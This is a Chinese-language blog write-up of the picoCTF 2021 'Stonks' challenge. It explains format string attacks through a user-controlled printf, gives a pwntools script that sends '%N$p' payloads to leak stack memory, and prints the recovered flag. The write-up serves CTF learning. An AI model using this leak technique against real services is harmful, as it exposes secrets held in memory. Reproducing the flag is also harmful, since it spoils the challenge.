---
layout: post
title: 初試 Format String Attack - picoCTF 2021 Stonks
tags: [CTF, pwn]
---

> I decided to try something no one else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!


infosec念了三年，CTF從來沒有碰過pwn題，決定來練個手

## 探索
`nc`過去會看到以下的畫面
```
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
```
選1的話
```
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
```
隨便塞點東西進去
```
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
DEADBEEF
Buying stonks with token:
DEADBEEF
Portfolio as of Wed Aug  4 07:06:25 UTC 2021


13 shares of AFWR
3 shares of FTT
2 shares of QTAE
40 shares of WJD
45 shares of IY
282 shares of JTT
1153 shares of Q
Goodbye!
```
然後就沒了...看來沒有什麼問題

選2的話
```
Portfolio as of Wed Aug  4 07:07:49 UTC 2021


You don't own any stonks!
Goodbye!
```

然後也沒了...

這樣看起來唯一可以被攻擊者控制的輸入是1的API token那一塊

---

題目額外給了[source code](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c)，快速看過去就知道問題在哪裡了
```c
int buy_stonks(Portfolio *p) {
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

  /* ... */

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```
所以先把flag讀進來，然後...是user-controlled printf，看來這題就是format string attack

## Format String Attack
> The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system. - [Format String Attack, OWASP](https://owasp.org/www-community/attacks/Format_string_attack)

簡單來說就是輸入的字串某種程度上被「執行」了，什麼意思呢

C有所謂的「格式化函數」，以`printf`為例
```c
printf("%d", a); // 把a「視為」一個整數輸出
printf("%s", a); // 把a指向的空間「視為」一個NULL-terminated字串輸出
printf("%s"); // 那這個呢？
```
在function call中，參數會一個一個疊在stack上，`printf`看到一個格式就會去找一個參數並依照設計好的方法解釋，那沒有參數怎麼辦？

`printf`也不會去管，就直接拿stack上的東西來用，也因此**Format String Attack可以用來讀stack上的資料**

而非常剛好的是，**`char[]`也是放在stack上面**(因為是local variable)，所以可以透過Format String Attack把flag弄出來

透過gdb也可以看出來flag放在哪裡

在`buy_stonks`的`printf`前設一個breakpoint然後看一下

{% include aligner.html images="posts/2021-08-17-format-string-attack/stack.png" column=1 %}

## 攻擊
```py
from pwn import *
from sys import exit

for i in range(100):
  print(f'\nCurrent i = {i}')
  try:
    s = remote('mercury.picoctf.net', 33411)

    s.recvuntil(b'2) View my portfolio')
    s.sendline(b'1')
    s.recvuntil(b'What is your API token?')
    s.sendline(bytes(f'%{i}$p', 'ascii'))
    res = s.recvuntil(b'Portfolio').split(b'\n')[2].decode('ascii')
    print(res)

    s.close()

    if res.startswith('0x'):
      for pos in range(2, len(res), 2):
        num = int(f'0x{res[pos]}{res[pos+1]}', base=16)
        print(hex(num), chr(num) if chr(num).isascii() else chr(num).isascii())
  
  except EOFError:
    s.close()
    print('Connection is dead.')
    continue

  except KeyboardInterrupt:
    s.close()
    exit(0)

  except IndexError:
    continue

# picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
```
用`%p`一次leak 4個byte，每個byte嘗試轉成ascii範圍內的char，然後要注意因為是little endian所以順序要反過來
```
Current i = 15
[+] Opening connection to mercury.picoctf.net on port 33411: Done
0x6f636970
[*] Closed connection to mercury.picoctf.net port 33411
0x6f o
0x63 c
0x69 i
0x70 p

Current i = 16
[+] Opening connection to mercury.picoctf.net on port 33411: Done
0x7b465443
[*] Closed connection to mercury.picoctf.net port 33411
0x7b {
0x46 F
0x54 T
0x43 C
```
開著運行一下就會看到flag的影子，一路輸出到`}`就是全部的flag

## 參考資料
- [https://owasp.org/www-community/attacks/Format_string_attack](https://owasp.org/www-community/attacks/Format_string_attack)
- [https://en.wikipedia.org/wiki/Printf_format_string#Vulnerabilities](https://en.wikipedia.org/wiki/Printf_format_string#Vulnerabilities)